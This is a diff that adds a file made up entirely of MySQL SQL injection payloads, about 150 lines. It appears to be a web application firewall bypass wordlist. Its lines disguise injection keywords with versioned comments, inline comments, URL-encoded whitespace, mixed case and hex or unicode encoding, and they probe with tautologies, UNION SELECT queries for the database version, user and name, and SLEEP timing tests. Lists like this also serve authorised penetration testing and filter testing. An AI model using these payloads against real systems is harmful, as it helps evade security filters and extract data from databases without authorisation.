@@ -1,0 +1,152 @@
+' /*!50000AND*/ 1=1--
+' /*!50000OR*/ 1=1--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' /*!12345UNION*/ /*!12345SELECT*/ @@version--
+' /*!50000UNION*/ /*!50000SELECT*/ user(),database()--
+' /**/AND/**/1=1--
+' /**/OR/**/1=1--
+' /**/UNION/**/SELECT/**/1,2,3--
+' /**/UNION/**/SELECT/**/@@version--
+' /**/UNION/**/SELECT/**/user(),database()--
+' %0AAND%0A1=1--
+' %0AOR%0A1=1--
+' %0AUNION%0ASELECT%0A1,2,3--
+' %0AUNION%0ASELECT%0A@@version--
+' %09AND%091=1--
+' %09OR%091=1--
+' %09UNION%09SELECT%091,2,3--
+' %0DAND%0D1=1--
+' %0DOR%0D1=1--
+' %0DUNION%0DSELECT%0D1,2,3--
+' %0CAND%0C1=1--
+' %0COR%0C1=1--
+' %0CUNION%0CSELECT%0C1,2,3--
+' %A0AND%A01=1--
+' %A0OR%A01=1--
+' %A0UNION%A0SELECT%A01,2,3--
+' AnD 1=1--
+' aNd 1=1--
+' anD 1=1--
+' OR 1=1--
+' oR 1=1--
+' Or 1=1--
+' UnIoN SeLeCt 1,2,3--
+' uNiOn sElEcT 1,2,3--
+' UNION SeLeCt 1,2,3--
+' UnIoN/**/SeLeCt/**/1,2,3--
+' uNiOn%0ASeLeCt%0A1,2,3--
+' AND(1)=(1)--
+' AND(1=1)--
+' OR(1)=(1)--
+' OR(1=1)--
+' UNION(SELECT(1),(2),(3))--
+' AND 1=1#
+' OR 1=1#
+' UNION SELECT 1,2,3#
+' AND 1=1;%00
+' OR 1=1;%00
+' UNION SELECT 1,2,3;%00
+' AND 1=1-- -
+' OR 1=1-- -
+' UNION SELECT 1,2,3-- -
+' AND 1=1--+
+' OR 1=1--+
+' UNION SELECT 1,2,3--+
+' AND 1=1--%20
+' OR 1=1--%20
+' UNION SELECT 1,2,3--%20
+' AND 1=1--%09
+' OR 1=1--%09
+' UNION SELECT 1,2,3--%09
+' AND BINARY 1=1--
+' OR BINARY 1=1--
+' UNION SELECT BINARY 1,2,3--
+' AND CHAR(49)=CHAR(49)--
+' OR CHAR(49)=CHAR(49)--
+' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
+' AND ASCII(49)=49--
+' OR ASCII(49)=49--
+' AND HEX('a')=HEX('a')--
+' OR HEX('a')=HEX('a')--
+' UNION SELECT HEX('test'),HEX('data'),HEX('here')--
+' AND UNHEX('61')='a'--
+' OR UNHEX('61')='a'--
+' AND CONV(10,10,16)='A'--
+' OR CONV(10,10,16)='A'--
+' /*!AND*/ 1=1--
+' /*!OR*/ 1=1--
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+' /*!50000AND*/ /*!50000SLEEP*/(5)--
+' /*!50000UNION*/ /*!50000SELECT*/ /*!50000SLEEP*/(5)--
+' %55nion %53elect 1,2,3--
+' %75nion %73elect 1,2,3--
+' uni%6fn sel%65ct 1,2,3--
+' %u0055nion %u0053elect 1,2,3--
+' %u0075nion %u0073elect 1,2,3--
+' AND 1=1 /*!50000AND*/ 1=1--
+' OR 1=1 /*!50000OR*/ 1=1--
+' UNION/**/ALL/**/SELECT/**/1,2,3--
+' UNION/**/DISTINCT/**/SELECT/**/1,2,3--
+' AND/**/1/**/=/**/1--
+' OR/**/1/**/=/**/1--
+' UNION/**/SELECT/**/1,/**/2,/**/3--
+' AND 1 LIKE 1--
+' OR 1 LIKE 1--
+' AND 'a' LIKE 'a'--
+' OR 'a' LIKE 'a'--
+' AND 1 REGEXP 1--
+' OR 1 REGEXP 1--
+' AND 'a' REGEXP 'a'--
+' OR 'a' REGEXP 'a'--
+' AND 1 RLIKE 1--
+' OR 1 RLIKE 1--
+' AND 'a' RLIKE 'a'--
+' OR 'a' RLIKE 'a'--
+' AND 1 IN (1)--
+' OR 1 IN (1)--
+' AND 'a' IN ('a')--
+' OR 'a' IN ('a')--
+' AND 1 BETWEEN 0 AND 2--
+' OR 1 BETWEEN 0 AND 2--
+' AND 'a' BETWEEN 'a' AND 'z'--
+' OR 'a' BETWEEN 'a' AND 'z'--
+' AND 1 IS NOT NULL--
+' OR 1 IS NOT NULL--
+' AND 'a' IS NOT NULL--
+' OR 'a' IS NOT NULL--
+' AND 1 XOR 0--
+' OR 1 XOR 0--
+' AND NOT 0--
+' OR NOT 0--
+' AND !!1--
+' OR !!1--
+' AND ~0--
+' OR ~0--
+' AND 1&1--
+' OR 1|1--
+' AND 1^0--
+' OR 1^0--
+' AND 1<<0--
+' OR 1>>0--
+' AND 1 DIV 1--
+' OR 1 DIV 1--
+' AND 1 MOD 1=0--
+' OR 1 MOD 1=0--
+' AND POW(1,1)=1--
+' OR POW(1,1)=1--
+' AND SQRT(1)=1--
+' OR SQRT(1)=1--
+' AND CEIL(1)=1--
+' OR CEIL(1)=1--
+' AND FLOOR(1)=1--
+' OR FLOOR(1)=1--
+' AND ROUND(1)=1--
+' OR ROUND(1)=1--
+' AND SIGN(1)=1--
+' OR SIGN(1)=1--
+' AND ABS(1)=1--
+' OR ABS(1)=1--
+' AND GREATEST(1,0)=1--
+' OR GREATEST(1,0)=1--
+' AND LEAST(1,2)=1--
+' OR LEAST(1,2)=1--
